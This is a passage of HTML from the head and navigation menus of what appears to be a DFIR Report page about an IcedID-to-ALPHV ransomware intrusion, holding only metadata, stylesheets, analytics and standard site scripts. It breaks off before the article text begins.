<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<title>IcedID Brings ScreenConnect and CSharp Streamer to ALPHV Ransomware Deployment &#8211; The DFIR Report</title>
			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 <meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="08b957ecebe7e48920177475-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel='stylesheet' id='jetpack_related-posts-css' href='https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='freenews-style-css' href='https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2' type='text/css' media='all' />
<style id='freenews-style-inline-css' type='text/css'>
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel='stylesheet' id='font-awesome-css' href='https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='freenews-google-fonts-css' href='https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css' type='text/css' media='all' />
<link rel='stylesheet' id='sharedaddy-css' href='https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
<script type="08b957ecebe7e48920177475-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/34931" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/" />
<link rel='shortlink' href='https://thedfirreport.com/?p=34931' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F06%2F10%2Ficedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F06%2F10%2Ficedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment%2F&#038;format=xml" />

		<!-- GA Google Analytics @ https://m0n.co/ga -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="08b957ecebe7e48920177475-text/javascript"></script>
		<script type="08b957ecebe7e48920177475-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>

	<script type="08b957ecebe7e48920177475-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=54748F7371D1DF34F1BA47CB171A542D');
</script>	<style>img#wpstats{display:none}</style>
		<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
	
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="IcedID Brings ScreenConnect and CSharp Streamer to ALPHV Ransomware Deployment" />
<meta property="og:url" content="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/" />
<meta property="og:description" content="Key Takeaways In October 2023, we observed an intrusion that began with a spam campaign, distributing a forked IcedID loader. The threat actor used Impacket&#8217;s wmiexec and RDP to install Scree…" />
<meta property="article:published_time" content="2024-06-10T00:44:23+00:00" />
<meta property="article:modified_time" content="2024-06-10T11:34:32+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2024/06/24952-053.png" />
<meta property="og:image:width" content="1880" />
<meta property="og:image:height" content="1152" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="IcedID Brings ScreenConnect and CSharp Streamer to ALPHV Ransomware Deployment" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2024/06/24952-053.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>

<body class="post-template-default single single-post postid-34931 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
	<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	
	<header id="masthead" class="site-header">
		<div id="main-header" class="main-header">
			<div class="navigation-top">
        		<div class="wrap">
            	<div id="site-header-menu" class="site-header-menu">
               	<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
							    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>						 </nav><!-- #site-navigation -->
           		</div>
        		</div><!-- .wrap -->
			</div><!-- .navigation-top -->
			       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			<div class="main-header-brand">
				<div class="header-brand">
					<div class="wrap">
						<div class="header-brand-content">
							    <div class="site-branding">
                <div class="site-branding-text">

                           <p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
                                <p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
            
        </div><!-- .site-branding-text -->
    </div><!-- .site-branding -->


							<div class="header-right">
								<div class="header-banner">

																	</div><!-- .header-banner -->
							</div><!-- .header-right -->
						</div><!-- .header-brand-content -->
					</div><!-- .wrap -->
				</div><!-- .header-brand -->

				<div id="nav-sticker">
					<div class="navigation-top">
						<div class="wrap">
							<div id="site-header-menu" class="site-header-menu">
								<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
								    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
